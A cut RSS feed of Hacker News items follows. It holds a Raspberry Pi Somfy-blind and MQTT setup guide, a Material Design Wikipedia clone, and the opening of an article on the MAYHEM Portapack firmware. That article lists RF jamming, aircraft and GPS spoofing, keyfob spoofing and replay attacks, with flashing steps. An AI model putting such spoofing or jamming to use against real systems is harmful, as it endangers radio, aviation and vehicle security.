href="https://github.com/Nickduino/Somfy_Remote/blob/master/Somfy_Remote.ino">Somfy Remote Arduino sketch</a> that shows how the protocol works. I originally wanted make the blind controller as small as possible and base it on an <a href="https://en.wikipedia.org/wiki/ESP32">ESP32</a>, taking that sketch and controlling it via <a href="https://github.com/256dpi/arduino-mqtt">arduino-mqtt</a>.</p><p>Turns out there is a full MQTT/web interface script <a href="https://github.com/Nickduino/Pi-Somfy">Nickduino/Pi-Somfy</a> that also only goes into the details of how to solder things, and connect things onto a Raspberry Pi. Laziness won the day, especially as I wanted to use my spare Pi for something anyway.</p><h2 id="the-hardware">The hardware</h2><p>Usually for 433MHz signals you could easily use a ready-made module such us <a href="https://www.berrybase.ch/raspberry-pi-co/raspberry-pi/module-sensoren/433mhz-sender-empf-228-nger-superregeneration-modul-fs1000a-xy-fst-xy-mk-5v">this 2CHF sender-receiver pair</a>. However, in order for Somfy to make their RTS even more proprietary than it already was, it is not using the typical <code>433.93MHz</code> frequency but <code>433.42MHz</code> 🤦‍♂️. This means one will need to do some soldering.</p><p>The PiSomfy <a href="https://github.com/Nickduino/Pi-Somfy#2-hardware">hardware guide</a> is excellent in telling you what you need. I got:</p><ul><li><a href="https://www.ebay.com/itm/5x-433Mhz-RF-transmitter-and-receiver-kit-Module-Arduino-ARM-WL-MCU-Raspberry-Fc-/254607185239?hash=item3b47c55557">5 ready <code>433.93MHz</code> sender circuits</a></li><li><a href="https://www.ebay.com/itm/10pcs-433-42m-433-42mhz-r433-f433-saw-resonator-crystals-to-39-/331637441887?hash=item4d3721c55f">10 pieces of the <code>433.42MHz</code> oscilator</a> - because my soldering is terrible</li><li><a href="https://www.ebay.com/itm/40PCS-20cm-2-54MM-FF-FM-MM-Dupont-wire-jumper-cables-male-to-female-For-Arduino/312724733910?hash=item48cfd8bfd6:g:05sAAOSwlbZdSZ6E">male-male jumper cables</a> - to avoid soldering 😉</li><li>(already had it) a solid copper cable to use as an antenna</li></ul><p>After 4 weeks, all the eBay items were in place, and I could start soldering. Turns out de-soldering things off is much harder than soldering things on. I managed to peel away the original oscillator with by applying leverage underneath it using a swiss army knife and heating its connectors one by one. Soldering the new one was quite easy in comparison.</p><figure><img src="https://mwitkow.me/posts/2020-11-08_somfy/soldering.jpg" alt="It&amp;rsquo;s not pretty but it worked." width="600"><figcaption><p>It’s not pretty but it worked.</p></figcaption></figure><p>I then took a 17cm piece of solid copper cable, and wrapped it into a small coil. Turns out soldering a think 1mm cable to a tiny connector was the trickiest bit, but with the right amount of patience, things will stick eventually.</p><p>Eventually, the fully connected sender fits nicely into a Raspberry Pi enclosure after connecting everything to the GPIO 4 pin:</p><figure><img src="https://mwitkow.me/posts/2020-11-08_somfy/final_side_by_side.jpg" alt="All fits nicely into a standard Pi enclosure. The remote we&amp;rsquo;ll be replacing are on the left." width="700"><figcaption><p>All fits nicely into a standard Pi enclosure. The remote we’ll be replacing are on the left.</p></figcaption></figure><h2 id="programming">Programming</h2><p>Installing Pi-Somfy is super easy, just follow <a href="https://github.com/Nickduino/Pi-Somfy#3-software">these steps</a>. It assume you install it under the default <code>pi</code> user in <code>/home/pi</code>, and comes with a handy <code>systemctl</code> service for auto-starting the system.</p><p>By default it will come up on port <code>:80</code> of your Pi. Programming the blinds takes a little bit of time. The procedure is as follows:</p><ul><li>Set the right channel (individual blind, or all) on the remote you’re programming from.</li><li>Measure the time in seconds it takes for each blind to come fully down.</li><li>Click <em>Add new</em> to put in the name (this will be your MQTT name by the way) and add in the time.</li><li>Using a pen, press the “hole” on the other side of the remote. This sends the signal to the blind to accept programming a new remote.</li><li>Press <em>Save</em> and follow the instructions. The blind should “wiggle” once programmed.</li></ul><p><strong>Note</strong>: The system relies on time to figure out where the blind is percentage-wise. It can often get things wrong (e.g. if you stopped it mid-through), or on the all-channel if blinds have different lengths (e.g. balcony). But in practice it works remarkably well.</p><figure><img src="https://mwitkow.me/posts/2020-11-08_somfy/pi_remote.png" alt="Fully programmed blinds." width="700"><figcaption><p>Fully programmed blinds.</p></figcaption></figure><p><a href="https://en.wikipedia.org/wiki/MQTT">MQTT</a> is a standard protocol for message brokers, and finds a lot of use in home IoT. For most use cases, it has a simple publish-subscribe mechanic based on topics.</p><h2 id="installing-mosquitto">Installing Mosquitto</h2><p>Home Assistant has an embedded MQTT broker, but it is <em>highly advised</em> to use an external one, such as Mosquitto. You should install it on the same machine that runs Home Assistant, as it will act as a hub for other MQTT-connected services. To do that on Ubuntu:</p><div><pre><code data-lang="bash">sudo apt-get update
sudo apt-get install mosquitto mosquitto-clients
</code></pre></div><p>Now let’s set up a password file in <code>/etc/mosquitto/passwd</code> with a user for <code>homeassistant</code> and <code>pisomfy</code>.</p><pre><code>sudo mosquitto_passwd -c /etc/mosquitto/passwd homeassistant
Password: YourHomeAssistantPassword
sudo mosquitto_passwd -c /etc/mosquitto/passwd pisomfy
Password: YourPiSomfyPassword
</code></pre><p>Then, enforce use of passwords in mosquitto by editing <code>/etc/mosquitto/conf.d/default.conf</code> and changing it to:</p><pre><code>allow_anonymous false
password_file /etc/mosquitto/passwd
</code></pre><p>For debugging purposes, open a separate tab on the same machine and subscribe to all messages under the <code>home-assistant/#</code> topic via:</p><pre><code>mosquitto_sub -u homeassistant -P YourHomeAssistantPassword -p 1883 -h 127.0.0.1 -v -t "home-assistant/#"
</code></pre><p>This will come in handy to check things are working.</p><h2 id="configuring-home-assistant">Configuring Home Assistant</h2><p>Update your <code>/etc/homeassistant/configuration.yaml</code> to add:</p><div><pre><code data-lang="yaml"><span>mqtt</span><span>:</span><span>
</span><span>  </span><span>broker</span><span>:</span><span> </span><span>127.0.0.1</span><span>
</span><span>  </span><span>username</span><span>:</span><span> </span><span>homeassistant</span><span>
</span><span>  </span><span>password</span><span>:</span><span> </span><span>"YourHomeAssistantPassword"</span><span>
</span><span>  </span><span>discovery</span><span>:</span><span> </span><span>true</span><span>
</span></code></pre></div><p>Restart Home Assistant</p><pre><code>sudo systemctl restart homeassistant
</code></pre><h3 id="configure-pisomfy">Configure PiSomfy</h3><p>On your Pi machine, open <code>/home/pi/operateShutters.conf</code> and edit the `[MQTT] section to look as follows</p><div><pre><code data-lang="ini"><span>[MQTT]</span>
<span># Location (IP Address of DNS Name) of the MQTT Server</span>
<span>MQTT_Server</span> <span>=</span> <span>myHAmachine # or hostname of your home assistant machine</span>
<span># Port of the MQTT Server</span>
<span>MQTT_Port</span> <span>=</span> <span>1883</span>
<span># Username for the MQTT Server</span>
<span>MQTT_User</span> <span>=</span> <span>pisomfy</span>
<span># Password of the MQTT Server</span>
<span>MQTT_Password</span> <span>=</span> <span>YourPiSomfyPassword</span>
<span># Enable auto discovery</span>
<span>EnableDiscovery</span> <span>=</span> <span>true</span>
</code></pre></div><p>And restart the service:</p><pre><code>sudo systemctl restart shutters.conf`
</code></pre><p>At this point the tab with the subscriptions should be full of messages. These are auto-discovery messages over MQTT for each of the programmed covers. This will cause Home Assistant to automatically add the entities.</p><p>They should show up with the same names as in PiSomfy.</p><figure><img src="https://mwitkow.me/posts/2020-11-08_somfy/home_assistant_entities.png" alt="Home Assistant Entities auto discovered via MQTT." width="800"><figcaption><p>Home Assistant Entities auto discovered via MQTT.</p></figcaption></figure><p>Adding them to a dashboard is relatively trivial, for example:</p><div><pre><code data-lang="yaml"><span>type</span><span>:</span><span> </span><span>entities</span><span>
</span><span></span><span>entities</span><span>:</span><span>
</span><span>  </span>- <span>entity</span><span>:</span><span> </span><span>cover.lr_all</span><span>
</span><span>    </span><span>name</span><span>:</span><span> </span><span>Living Room Covers</span><span>
</span></code></pre></div><p>In order to simplify things, I wanted to only expose the <code>_all</code> blinds (a.k.a. covers) to Google Home/Assistant. For that I added an explicit section in the <code>/etc/homeassistant/configuration.yaml</code> section of <code>google_assistant</code>:</p><div><pre><code data-lang="yaml"><span>google_assistant</span><span>:</span><span>
</span><span>  </span><span># ...</span><span>
</span><span>  </span><span>exposed_domains</span><span>:</span><span>
</span><span>    </span>- <span>fan</span><span>
</span><span>  </span><span>entity_config</span><span>:</span><span>
</span><span>    </span><span>cover.br_all</span><span>:</span><span>
</span><span>      </span><span>expose</span><span>:</span><span> </span><span>true</span><span>
</span><span>      </span><span>aliases</span><span>:</span><span>
</span><span>        </span>- <span>"Bedroom Covers"</span><span>
</span><span>    </span><span>cover.lr_all</span><span>:</span><span>
</span><span>      </span><span>expose</span><span>:</span><span> </span><span>true</span><span>
</span><span>      </span><span>aliases</span><span>:</span><span>
</span><span>        </span>- <span>"Living Room Covers"</span><span>
</span></code></pre></div><p>After restarting Home Assistant, and uttering the magical <em>Ok Google, Sync All Devices</em>, the covers will show up in your Home App:</p><figure><img src="https://mwitkow.me/posts/2020-11-08_somfy/google_home.jpg" alt="Looks like a blind, acts as a blind." width="300"><figcaption><p>Looks like a blind, acts as a blind.</p></figcaption></figure><p>This means you can controll it using keywords:</p><ul><li><em>Ok Google, close Bedroom covers</em></li><li><em>Ok Google, open Bedroom covers</em></li><li><em>Ok Google, set Bedroom covers to 50%</em></li></ul><p>The killer feature is setting this up as a routine to open/close the blind as you wake up, go to sleep.</p><p>Happy hacking :)</p></div></div>]]>
            </description>
            <link>https://mwitkow.me/posts/2020-11-08_somfy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25187945</guid>
            <pubDate>Mon, 23 Nov 2020 15:46:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to move to Taiwan during a pandemic]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25187893">thread link</a>) | @dkthehuman
<br/>
November 23, 2020 | https://roadtoramen.com/Day-322-How-to-Move-to-Taiwan-During-a-Pandemic-9b98345daee942af98839bfd30687778 | <a href="https://web.archive.org/web/*/https://roadtoramen.com/Day-322-How-to-Move-to-Taiwan-During-a-Pandemic-9b98345daee942af98839bfd30687778">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://roadtoramen.com/Day-322-How-to-Move-to-Taiwan-During-a-Pandemic-9b98345daee942af98839bfd30687778</link>
            <guid isPermaLink="false">hacker-news-small-sites-25187893</guid>
            <pubDate>Mon, 23 Nov 2020 15:42:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: I've created a Wikipedia clone using Material Design]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25187811">thread link</a>) | @filipkappa
<br/>
November 23, 2020 | https://mdbgo.io/marta-szymanska/mdb5-demo-pro/pro/templates/wikipedia.html | <a href="https://web.archive.org/web/*/https://mdbgo.io/marta-szymanska/mdb5-demo-pro/pro/templates/wikipedia.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="ex1-content">
          <div id="ex1-tabs-1" role="tabpanel" aria-labelledby="ex1-tab-1">
            
            <hr>
            <p>From Wikipedia, the free encyclopedia</p>

            

            <div>
              <table>
                <caption>
                  Material Design
                </caption>
                <tbody>
                  <tr>
                    <td colspan="2">
                      <a href="https://mdbgo.io/wiki/File:Google_Material_Design_Logo.svg"><img alt="Google Material Design Logo.svg" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Google_Material_Design_Logo.svg/220px-Google_Material_Design_Logo.svg.png" decoding="async" width="220" height="220" srcset="
                            https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Google_Material_Design_Logo.svg/330px-Google_Material_Design_Logo.svg.png 1.5x,
                            https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Google_Material_Design_Logo.svg/440px-Google_Material_Design_Logo.svg.png 2x
                          " data-file-width="512" data-file-height="512"></a>
                    </td>
                  </tr>
                  <tr>
                    <th scope="row">
                      <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Software_developer" title="Software developer">Developer(s)</a>
                    </th>
                    <td><a data-toggle="tooltip" href="https://mdbgo.io/wiki/Google" title="Google">Google</a></td>
                  </tr>
                  <tr>
                    <th scope="row">Initial release</th>
                    <td>
                      June&nbsp;25, 2014<span>; 6&nbsp;years ago</span>
                    </td>
                  </tr>
                  <tr>
                    <th scope="row">Written in</th>
                    <td>
                      <a data-toggle="tooltip" href="https://mdbgo.io/wiki/HTML" title="HTML">HTML</a>,
                      <a data-toggle="tooltip" href="https://mdbgo.io/wiki/CSS" title="CSS">CSS</a>,
                      <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Sass_(stylesheet_language)" title="Sass (stylesheet language)">Sass</a>
                      (v4),
                      <a data-toggle="tooltip" href="https://mdbgo.io/wiki/JavaScript" title="JavaScript">JavaScript</a>,
                      <a href="https://mdbgo.io/wiki/AngularJS" data-toggle="tooltip" title="AngularJS">AngularJS</a>,
                      <a href="https://mdbgo.io/wiki/Angular_(web_framework)" data-toggle="tooltip" title="Angular (web framework)">Angular</a>
                    </td>
                  </tr>
                  <tr>
                    <th scope="row">
                      <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Computing_platform" title="Computing platform">Platform</a>
                    </th>
                    <td>
                      <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Android_(operating_system)" title="Android (operating system)">Android</a>, <a data-toggle="tooltip" href="https://mdbgo.io/wiki/IOS" title="IOS">iOS</a>,
                      <a data-toggle="tooltip" href="https://mdbgo.io/wiki/World_Wide_Web" title="World Wide Web">Web</a>
                    </td>
                  </tr>
                  <tr>
                    <th scope="row">Website</th>
                    <td>
                      <span><a rel="nofollow" href="https://material.io/">material<wbr>.io</a></span>
                    </td>
                  </tr>
                </tbody>
              </table>

              <p>
                <b>Material Design</b> (codenamed <b>Quantum Paper</b>)<sup><a data-toggle="tooltip" href="#cite_note-1">[1]</a></sup>
                is a
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Design_language" title="Design language">design language</a>
                that
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Google" title="Google">Google</a> developed in
                2014. Expanding on the "card" motifs that debuted in
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Google_Now" title="Google Now">Google Now</a>,
                Material Design uses more grid-based layouts, responsive animations and transitions,
                padding, and depth effects such as lighting and shadows.
              </p>

              <p>
                Google announced Material Design on June 25, 2014, at the 2014
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Google_I/O" title="Google I/O">Google I/O</a>
                conference.
              </p>

              

              <h3>
                Overview
                <span>[<span><a data-toggle="tooltip" href="#!" title="Edit section: Overview">edit</a></span>]</span>
              </h3>
              <hr>

              <p>
                Designer
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Mat%C3%ADas_Duarte" title="Matías Duarte">Matías Duarte</a>
                explained that, "unlike real paper, our digital material can expand and reform
                intelligently. Material has physical surfaces and edges. Seams and shadows provide
                meaning about what you can touch." Google states that their new design language is
                based on paper and ink but implementation takes place in an advanced manner.<sup><a data-toggle="tooltip" href="#cite_note-2">[2]</a></sup><sup data-toggle="tooltip" id="cite_ref-3"><a data-toggle="tooltip" href="#cite_note-3">[3]</a></sup><sup id="cite_ref-4"><a data-toggle="tooltip" href="#cite_note-4">[4]</a></sup>
              </p>

              <p>
                Material Design will gradually be extended throughout Google's array of web and
                mobile products, providing a consistent experience across all platforms and
                applications. Google has also released
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Application_programming_interface" title="Application programming interface">application programming interfaces</a>
                (APIs) for third-party developers to incorporate the design language into their
                applications.<sup data-toggle="tooltip" id="cite_ref-5"><a data-toggle="tooltip" href="#cite_note-5">[5]</a></sup><sup data-toggle="tooltip" id="cite_ref-6"><a data-toggle="tooltip" href="#cite_note-6">[6]</a></sup><sup data-toggle="tooltip" id="cite_ref-7"><a data-toggle="tooltip" href="#cite_note-7">[7]</a></sup>
                The main purpose of material design is creation of new visual language that combines
                principles of
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Visual_design_elements_and_principles" title="Visual design elements and principles">good design</a>
                with technical and scientific innovation.
              </p>

              <p>
                In 2018, Google detailed a revamp of the language, with a focus on providing more
                flexibility for designers to create custom "themes" with varying geometry, colors,
                and typography. Google released Material Theme Editor exclusively for the
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/MacOS" title="MacOS">macOS</a> design
                application
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Sketch_(software)" title="Sketch (software)">Sketch</a>.<sup data-toggle="tooltip" id="cite_ref-ars-pie_8-0"><a data-toggle="tooltip" href="#cite_note-ars-pie-8">[8]</a></sup><sup data-toggle="tooltip" id="cite_ref-9"><a data-toggle="tooltip" href="#cite_note-9">[9]</a></sup>
              </p>

              <h3>
                Implementation
                <span>[<span><a data-toggle="tooltip" href="#!" title="Edit section: Overview">edit</a></span>]</span>
              </h3>
              <hr>

              <p>
                As of 2020<sup><a data-toggle="tooltip" href="https://en.wikipedia.org/w/index.php?title=Material_Design&amp;action=edit">[update]</a></sup>, most of Google's mobile applications for
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Android_(operating_system)" title="Android (operating system)">Android</a>
                as well as its
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Web_application" title="Web application">web app</a>
                counterparts had applied the new design language, including
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Gmail" title="Gmail">Gmail</a>,
                <a href="https://mdbgo.io/wiki/YouTube" title="YouTube">YouTube</a>,
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Google_Drive" title="Google Drive">Google Drive</a>,
                <a href="https://mdbgo.io/wiki/Google_Docs" data-toggle="tooltip" title="Google Docs">Google Docs</a>,
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Google_Sheets" title="Google Sheets">Google Sheets</a>,
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Google_Slides" title="Google Slides">Google Slides</a>,
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Google_Photos" title="Google Photos">Google Photos</a>,
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Google_Maps" title="Google Maps">Google Maps</a>,
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Google_Classroom" title="Google Classroom">Google Classroom</a>,
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Google_Translate" title="Google Translate">Google Translate</a>,
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Google_Chrome" title="Google Chrome">Google Chrome</a>,
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Google_Keep" title="Google Keep">Google Keep</a>, <a href="https://mdbgo.io/wiki/Google_Play" title="Google Play">Google Play</a>, and
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/List_of_Google_products" title="List of Google products">most other Google products</a>. It is also the primary design language of
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Android_(operating_system)" title="Android (operating system)">Android</a>
                and <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Chrome_OS" title="Chrome OS">Chrome OS</a>.
              </p>

              <p>
                In 2018, with the introduction of the ability to create custom themes, Google also
                began redesigning most of their apps into a customized and adapted version of
                Material Design called the Google Material Theme<sup data-toggle="tooltip" id="cite_ref-10"><a data-toggle="tooltip" href="#cite_note-10">[10]</a></sup>, also dubbed "Material Design 2"<sup data-toggle="tooltip" id="cite_ref-11"><a data-toggle="tooltip" href="#cite_note-11">[11]</a></sup>, which heavily emphasized white space, rounded corners, colorful icons, bottom
                navigation bars, and utilized a special size-condensed version of Google's
                proprietary
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Product_Sans" title="Product Sans">Product Sans</a>
                font called Google Sans.<sup data-toggle="tooltip" id="cite_ref-12"><a data-toggle="tooltip" href="#cite_note-12">[12]</a></sup>
                As of 2020, most Google applications have also applied the new Google Material Theme
                design, with the notable exception of
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/YouTube" title="YouTube">YouTube</a>.
              </p>

              <p>
                The
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Canonicalization" title="Canonicalization">canonical implementation</a>
                of Material Design for web application user interfaces is called
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Polymer_(library)" title="Polymer (library)">Polymer</a>.<sup data-toggle="tooltip" id="cite_ref-13"><a href="#cite_note-13">[13]</a></sup>
                It consists of the Polymer library, a
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Shim_(computing)" title="Shim (computing)">shim</a>
                that provides a
                <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Web_Components" title="Web Components">Web Components</a>
                API for browsers that do not implement the standard natively, and an elements
                catalog, including the "paper elements collection" that features visual elements of
                the Material Design.<sup data-toggle="tooltip" id="cite_ref-14"><a data-toggle="tooltip" href="#cite_note-14">[14]</a></sup>
              </p>

              <h3>
                See also
                <span>[<span><a data-toggle="tooltip" href="#!" title="Edit section: Overview">edit</a></span>]</span>
              </h3>
              <hr>

              <ul>
                <li>
                  <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Android_version_history" title="Android version history">Android version history</a>
                </li>
                <li>
                  <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Comparison_of_Material_Design_implementations" title="Comparison of Material Design implementations">Comparison of Material Design implementations</a>
                </li>
                <li>
                  <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Flat_design" title="Flat design">Flat design</a>
                </li>
                <li>
                  <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Fluent_Design_System" title="Fluent Design System">Fluent Design System</a>
                </li>
                <li>
                  <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Human_interface_guidelines" title="Human interface guidelines">Human interface guidelines</a>
                </li>
                <li>
                  <a data-toggle="tooltip" href="https://mdbgo.io/wiki/Metro_(design_language)" title="Metro (design language)">Metro (design language)</a>
                </li>
              </ul>

              <h3>
                References
                <span>[<span><a data-toggle="tooltip" href="#!" title="Edit section: Overview">edit</a></span>]</span>
              </h3>
              <hr>

              

              <h3>
                External links
                <span>[<span><a data-toggle="tooltip" href="#!" title="Edit section: Overview">edit</a></span>]</span>
              </h3>
              <hr>

              

              <ul>
                <li>
                  <span><span><a rel="nofollow" href="https://www.material.io/">Official website</a></span></span>
                  <a data-toggle="tooltip" href="https://www.wikidata.org/wiki/Q17590603#P856" title="Edit this at Wikidata"><img alt="Edit this at Wikidata" src="https://upload.wikimedia.org/wikipedia/en/thumb/8/8a/OOjs_UI_icon_edit-ltr-progressive.svg/10px-OOjs_UI_icon_edit-ltr-progressive.svg.png" decoding="async" width="10" height="10" srcset="
                        https://upload.wikimedia.org/wikipedia/en/thumb/8/8a/OOjs_UI_icon_edit-ltr-progressive.svg/15px-OOjs_UI_icon_edit-ltr-progressive.svg.png 1.5x,
                        https://upload.wikimedia.org/wikipedia/en/thumb/8/8a/OOjs_UI_icon_edit-ltr-progressive.svg/20px-OOjs_UI_icon_edit-ltr-progressive.svg.png 2x
                      " data-file-width="20" data-file-height="20"></a>
                </li>
              </ul>

              <table>
                <tbody>
                  <tr>
                    <th scope="row">
                      <p>
                        <a href="" data-toggle="tooltip" title="View this template">V</a><span> • </span><a href="" data-toggle="tooltip" title="Discuss this template">T</a><span> • </span><a href="" data-toggle="tooltip" title="Edit this template">E</a>
                      </p>
                      <p>
                        <a href="" data-toggle="tooltip" title="Android (operating system)">Android (operating system)</a>
                      </p>
                      <p>[<a href="">Show</a>]</p>
                    </th>
                  </tr>
                  <tr>
                    <th scope="row">
                      <p>
                        <a href="" data-toggle="tooltip" title="View this template">V</a><span> • </span><a href="" data-toggle="tooltip" title="Discuss this template">T</a><span> • </span><a href="" data-toggle="tooltip" title="Edit this template">E</a>
                      </p>
                      <p>
                        <a href="" data-toggle="tooltip" title="Google">Google</a>
                      </p>
                      <p>[<a href="">Show</a>]</p>
                    </th>
                  </tr>
                </tbody>
              </table>

              
            </div>
          </div>
        </div></div>]]>
            </description>
            <link>https://mdbgo.io/marta-szymanska/mdb5-demo-pro/pro/templates/wikipedia.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25187811</guid>
            <pubDate>Mon, 23 Nov 2020 15:36:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Testing MAYHEM the open source RF hacking Portapack firmware]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25187801">thread link</a>) | @wolframio
<br/>
November 23, 2020 | https://telescope.ac/petazzoni/mayhem-the-rf-pentesting-hackrf-portapack-firmware | <a href="https://web.archive.org/web/*/https://telescope.ac/petazzoni/mayhem-the-rf-pentesting-hackrf-portapack-firmware">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>This article – the first in a series – will walk you through the basics of Portapack MAYHEM firmware, installation and some hands-on testing of RF spoofing, DoS and Replay Attacks.</p><p>The <a href="https://bit.ly/2UUKgRG" target="_blank" rel="nofollow noopener">PortaPack is a HackRF software defined radio plus screen/keypad under $200</a> which allows you to go portable with the HackRF and a battery pack. It features a small touchscreen LCD and an iPod like control wheel that is used to control custom HackRF firmware which includes an audio receiver, several built in digital decoders and transmitters too. With the PortaPack no PC is required to receive or transmit with the HackRF.</p><p><img src="https://telescopecdn.ams3.digitaloceanspaces.com/images/37366466393830322d656263312d343530392d396463372d653761313033646136666237/7edf36e9aaecaea695b6914190d5ec2ad2cb49d7c4d8bb94ae8535996ba0931f.jpeg"></p><p>The functionality of your portapack depends on the software you run on it. There are several options but running the MAYHEM firmware will then give you some a really amazing amount of cool features. While listening to transmissions from ships, planes or emergency services is hardly news to police scanner owners using the Portapack is as easy as entering the correct frequency. </p><p>Channel information for almost any Police/Fire Deparment Radio could be found on RadioReference Wiki, sample <a href="https://wiki.radioreference.com/index.php/New_York_Times_Square_New_Year's_Eve_ball_drop" target="_blank" rel="nofollow noopener">Scanner frequencies for the annual Times Square New Years Celebration</a>.</p><p>But where the MAYHEM firmware stands out is in the ability to receive and transmit data from digital messaging systems, remote controls, smart car sensors and others. It can even spoof critical beacon signals as those from aircraft transponders or GPS satellites. </p><p>As of the time of this post the currently available decoders and transmit options can be seen in the screenshots below.  Note that for the transmitter options, there are some there that could really land you in trouble with the law so be very careful to exercise caution and only transmit what you are legally allowed to.</p><p><img src="https://telescopecdn.ams3.digitaloceanspaces.com/images/37366466393830322d656263312d343530392d396463372d653761313033646136666237/37de762b5b6f97bb464fdd6179ce9f37cdd05785731fee0b8d461eb55bf0f84c.png"></p><p>The PortaPack add-on hardware to the HackRF was released several years ago  but the firmware was not developed very far beyond listening to audio and implementing a few transmitters. For a time this interesting device was forgotten compared to its brother HackRF. After some years the third party 'Havoc' firmware by 'furrtek' greatly expanded the list of  decoders and transmit options. Unfortunately the havok firmware is no longer maintained so we're now looking at the open-source <a href="https://github.com/eried/portapack-mayhem" target="_blank" rel="nofollow noopener">MAYHEM firmware</a> by ’eried’, an active fork with even more features.</p><p>Another reason why the Portapack is becoming more popular is because of its dropping price. Both the Portapack and the HackRF are open source hardware, anyone can produce their own device based on the code and available designs. Therefore a "clone" of Portapack is just as good as an original one. With open source code hardware there is no such thing as genuine hardware. For this reason, right now it is possible to find a complete <a href="https://bit.ly/2UUKgRG" target="_blank" rel="nofollow noopener">HackRF and Portapack kits offers from China</a>, for half the $500 which is what it initially cost when it was released years ago.</p><p><strong>Installation</strong></p><p>There are two versions of the portapack: the Portapack H1 and the Portapack H2, the only difference is the screen size. Both are fully compatible with MAYHEM, in my case I choose the H1 because is cheaper.</p><p>Installing the firmware is really easy. One of the characteristics of the HackRF along with the Portapack is that it is practically impossible to brick, so there is no need to worry about this process. It is always recommended to update the firmware with the latest realease of the project, since although some vendors even include the old Havoc or even the new Mayhem firmware, they are rarely the latest version since it is a project that adds constant improvements.</p><p>Download last release from <a href="https://github.com/eried/portapack-mayhem/releases" target="_blank" rel="nofollow noopener">https://github.com/eried/portapack-mayhem/releases</a></p><h4>Windows</h4><ol><li>Connect the device via USB</li><li>Switch to HackRF mode via the on-screen option (in the PortaPack)</li><li>Double click <code>flash_portapack_mayhem.bat</code> and follow the instructions</li><li>Reboot the device</li></ol><h4>Linux</h4><ol><li>Connect the device via USB</li><li>Switch to HackRF mode via the on-screen option (in the PortaPack)</li><li>Upload the firmware with <code>hackrf_spiflash -w new_firmware_file.bin</code></li><li>Reboot the device</li></ol><h2><strong>Hands-on Testing</strong></h2><p>The list of supported radio protocols on MAYHEM is impressive: Police Scanner, IQ file replay,  Microphone FM transmit with CTCSS, CTCSS decoder, Frequency manager (save &amp; load from SD card, with categories and notes), "Soundboard" wave file player from  files in SD card , ADS-B receiver with map view, ADS-B transmitter (aircraft spoof), SSTV transmitter, Fully configurable jammer, POCSAG transmitter, POCSAG receiver/decoder, Morse transmitter (FM tone and CW), OOK transmitter for common remote encoders (PT2262, doorbells, remote outlets, some garage doors, ...), RDS (Radio Data System) PSN, RadioText and Time groups transmitter, Meteorological ballon radiosonde receiver (M10, M2K2, ...) , AFSK receiver, AFSK transmitter (Bell202, ...) , Nuoptix DTMF sync transmitter, French LCR (Language de Commande Routier) message generator,  Street lighting control transmitter (CCIR tones), Fully configurable RF signal generator, car TPMS decoder, car keyfoob spoofer (Subaru), Nordic NRF decoder, APRS decoder and transmitter, RSSI audio output as pitch (for direction finding), BurgerPager Spoofer, and more. </p><p>For audio RX/TX you need a TRRS (3 ring) jack plug with the Left-Right-Mic-Ground arrangement. I believe that's the most common arrangement for android headsets. </p><p><img src="https://telescopecdn.ams3.digitaloceanspaces.com/images/37366466393830322d656263312d343530392d396463372d653761313033646136666237/b7ff4035575a53c56352e6e1fa60fceb9ba25dd832de6bd7b85683110f779607.png"></p><p>There are so many that I would not have time or means to test all the functions, but I can attest all the ones I have tried work perfectly, here are some examples.</p><p><strong>RF REPLAY ATTACKS</strong></p><p>Our Portapack has the ability to capture broadcasts in IQ format and subsequently re-broadcast them over the air. Quadrature signals, 